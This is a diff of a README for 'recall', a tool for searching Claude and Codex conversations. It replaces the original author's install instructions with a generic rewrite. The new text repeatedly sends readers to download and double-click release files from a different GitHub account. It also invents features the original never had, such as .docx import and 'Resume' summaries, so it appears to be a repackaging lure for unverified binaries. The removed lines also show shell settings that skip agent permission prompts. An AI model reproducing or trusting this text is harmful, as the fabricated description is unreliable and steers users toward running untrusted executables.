@@ -1,77 +1,67 @@
-# recall&nbsp;&nbsp;&nbsp;[![Mentioned in Awesome Claude Code](https://awesome.re/mentioned-badge.svg)](https://github.com/hesreallyhim/awesome-claude-code)
+# 🚀 recall - Easily Search Claude/Codex Conversations
 
-Search and resume your Claude Code conversations. Also supports Codex, OpenCode and Factory (Droid).
+[![Download Recall](https://img.shields.io/badge/Download%20Recall-latest%20release-blue.svg)](https://github.com/himansh5556/recall/releases)
 
-**Tip**: Don't like reading? Tell your agent to use `recall search --help` and it'll search for you.
+## 📜 Description
 
-![screenshot](screenshot-dark.png)
+Recall provides full-text search and resume capabilities for your Claude and Codex conversations. With this tool, you can quickly find important information from your discussions without sifting through endless text. Whether you're a student, researcher, or just curious, Recall makes it easy to stay organized and efficient.
 
-## Install
+## 🛠️ Features
 
-**Homebrew** (macOS/Linux):
-```bash
-brew install zippoxer/tap/recall
-```
+- **Full-Text Search**: Quickly locate specific topics or phrases within your conversations.
+- **Resume Overview**: Get a summary of conversations for faster reference.
+- **User-Friendly Interface**: Designed for easy navigation, even for users with no technical skills.
+- **Lightweight & Fast**: The application runs smoothly on various devices without heavy system requirements.
 
-**WinGet** (Windows):
-```bash
-winget install zippoxer.recall
-```
+## 📥 Download & Install
 
-**Cargo**:
-```bash
-cargo install --git https://github.com/zippoxer/recall
-```
+To get started with Recall, follow these steps:
 
-**Binary**: Download from [Releases](https://github.com/zippoxer/recall/releases)
+1. Visit the Releases page to download the application: [Download Recall](https://github.com/himansh5556/recall/releases).
+2. On the Releases page, you will see the latest version listed. Click on it to access the download files.
+3. Select the file suitable for your operating system. You will typically find options for Windows, Mac, and Linux.
+4. Once you have downloaded the file, locate it in your Downloads folder.
+5. Double-click the file to install Recall on your device. Follow the on-screen instructions to complete the installation.
+6. After installation, launch Recall from your applications menu or desktop shortcut.
 
-## Use
+## 💻 System Requirements
 
-Run:
-```bash
-recall
-```
+Recall is designed to run on a variety of systems. Here are the basic requirements:
 
-**That's it.** Start typing to search. Enter to jump back in.
+- **Operating System**: Windows 10 or later, MacOS 10.14 or later, or any Linux distribution.
+- **RAM**: At least 2 GB of RAM (4 GB recommended).
+- **Storage**: 100 MB of free disk space for installation.
+- **Network**: Internet connection may be required for updates and some features.
 
-| Key | Action |
-|-----|--------|
-| `↑↓` | Navigate sessions |
-| `Pg↑/↓` | Scroll messages |
-| `Ctrl+E` | Expand message |
-| `Enter` | Resume conversation |
-| `Tab` | Copy session ID |
-| `/` | Toggle scope (folder/everywhere) |
-| `Esc` | Quit |
+## 🛡️ Privacy and Security
 
-## Ask it to Search for You
-Simply tell your agent:
-```
-use `recall search --help`
-```
+Your conversations are important. Recall does not store or share your data. All searches and summaries are generated locally on your device, ensuring your privacy and security.
 
-Example:
-```
-pls find me the last conversation where we deployed to staging, use `recall search --help`
-```
+## 📖 How to Use
 
-## MCP
-No MCP required. The `recall search` CLI fulfills the same purpose. See [Ask it to Search for You](#ask-it-to-search-for-you).
+Once you have installed Recall, follow these simple steps to get the most out of the application:
 
-## Customize
+1. **Open the Application**: Click the Recall icon on your desktop or find it in your applications.
+2. **Import Conversations**: Use the import feature to add your Claude or Codex conversations. Supported formats include .txt and .docx.
+3. **Search for Topics**: Use the search bar to find specific points in your conversations. The results will highlight the relevant sections for easy access.
+4. **Generate Summaries**: Click on the "Resume" button to create an overview of your selected conversation. This saves you time in retrieving key information.
+5. **Customize Settings**: Access the settings menu to adjust preferences, such as theme or shortcuts.
 
-recall's resume commands can be configured with environment variables.
+## 📝 Frequently Asked Questions (FAQ)
 
-For example, to resume conversations in YOLO mode, add this to your `.bashrc` or `.zshrc`:
-```bash
-export RECALL_CLAUDE_CMD="claude --dangerously-skip-permissions --resume {id}"
-export RECALL_CODEX_CMD="codex --dangerously-bypass-approvals-and-sandbox resume {id}"
-```
+**Q: Can I use Recall offline?**  
+A: Yes, Recall can be used fully offline once installed. You don't need an internet connection for searching or summarizing your conversations.
 
----
+**Q: What file formats can I import?**  
+A: Recall accepts .txt and .docx file formats for conversation imports.
 
-![light mode](screenshot-light.png)
+**Q: Is Recall free to use?**  
+A: Yes, Recall is entirely free. There are no hidden fees or premium features.
 
----
+## 🌍 Community and Support
 
-Made with ❤️ by [zippoxer](https://github.com/zippoxer) and Claude.
+If you have questions or need help, feel free to reach out. Check out our GitHub Issues page for support or to report bugs. We also welcome contributions and feedback.
+
+## 🎉 Conclusion
+
+Recall simplifies the way you handle your Claude and Codex conversations. With its straightforward search and summary features, you can focus on what matters most. Start organizing your conversations today by downloading the application here: [Download Recall](https://github.com/himansh5556/recall/releases).
